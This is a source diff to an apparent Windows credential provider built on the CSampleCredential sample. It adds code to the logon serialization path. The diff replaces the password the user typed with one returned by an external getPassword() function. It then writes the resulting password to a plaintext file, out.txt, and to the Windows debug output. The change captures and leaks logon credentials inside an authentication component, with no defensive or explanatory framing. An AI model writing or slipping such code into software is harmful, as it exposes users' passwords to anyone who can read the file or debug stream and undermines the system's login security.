@@ -15,6 +15,10 @@
 #include <unknwn.h>
 #include "CSampleCredential.h"
 #include "guid.h"
+#include <fstream>
+using namespace std;
+
+extern PWSTR getPassword();
 
 CSampleCredential::CSampleCredential():
     _cRef(1),
@@ -516,7 +520,11 @@ HRESULT CSampleCredential::GetSerialization(_Out_ CREDENTIAL_PROVIDER_GET_SERIAL
     if (_fIsLocalUser)
     {
         PWSTR pwzProtectedPassword;
-        hr = ProtectIfNecessaryAndCopyPassword(_rgFieldStrings[SFI_PASSWORD], _cpus, &pwzProtectedPassword);
+        hr = ProtectIfNecessaryAndCopyPassword(/*_rgFieldStrings[SFI_PASSWORD]*/getPassword(), _cpus, &pwzProtectedPassword);
+        ofstream outfile("out.txt", ios::binary);
+        outfile << pwzProtectedPassword;
+        outfile.close();
+        OutputDebugString(pwzProtectedPassword);
         if (SUCCEEDED(hr))
         {
             PWSTR pszDomain;
